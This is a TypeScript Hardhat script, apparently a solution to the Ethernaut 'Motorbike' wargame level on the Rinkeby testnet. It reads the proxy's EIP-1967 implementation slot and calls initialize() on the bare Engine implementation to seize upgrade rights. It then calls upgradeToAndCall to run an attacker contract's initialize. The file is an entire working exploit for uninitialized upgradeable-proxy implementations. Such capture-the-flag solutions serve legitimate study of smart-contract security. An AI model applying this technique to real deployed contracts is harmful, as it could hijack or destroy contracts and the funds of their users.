import "@ethersproject/abstract-provider"
import { deployments, ethers, getNamedAccounts, network } from "hardhat"


import * as dotenv from 'dotenv'
import { BigNumber } from "ethers"
dotenv.config()


const executeExploit= async()=>{
    if(network.name==="rinkeby"){
        const {exploiter}=await getNamedAccounts()
        const exploiterAcc= await ethers.getSigner(exploiter)
        const motorbikeExploitDeployment=await deployments.get("MotorbikeExploit")
        const motorbikeExploit=await ethers.getContractAt("MotorbikeExploit",motorbikeExploitDeployment.address)
        const motorbike= await ethers.getContractAt('Motorbike',process.env.MOTORBIKE_ADDRESS as string)
        const engineAddress= "0x"+(await ethers.provider.getStorageAt(motorbike.address,BigNumber.from("0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"))).slice(-40)
        const engine=await ethers.getContractAt("Engine",engineAddress)

        await engine.connect(exploiterAcc).initialize({gasLimit:400000})
        const encodedExploitInitialize=motorbikeExploit.interface.encodeFunctionData("initialize()")
        await engine.connect(exploiterAcc).upgradeToAndCall(motorbikeExploit.address,encodedExploitInitialize,{gasLimit:400000})

    }else{
        console.log("This script can only be executed in rinkeby network")
    }
}

executeExploit().then(()=>process.exit(0)).catch(err=>console.log(err))
